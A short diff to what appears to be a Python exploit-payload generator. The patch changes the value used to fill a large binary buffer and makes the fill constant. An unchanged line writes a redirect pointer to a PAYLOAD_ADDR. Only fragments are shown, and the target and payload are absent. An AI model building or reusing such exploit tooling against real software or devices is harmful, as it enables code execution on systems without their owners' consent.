@@ -1,7 +1,7 @@
 import os,sys,struct
 #1bf70
 size=0x127c1c
-d=0x33333333
+d=0x33333334
 out=bytearray(size)
 OFFSET=0
 
@@ -47,7 +47,7 @@ def addr_convert(addr):
 	
 
 for i in range(0,size-1,4):
-	temp=d+(i//4)
+	temp=d
 	out[i:i+4]=struct.pack("<I",temp)
 	
 write32(redirect_offs, addr_convert(PAYLOAD_ADDR))
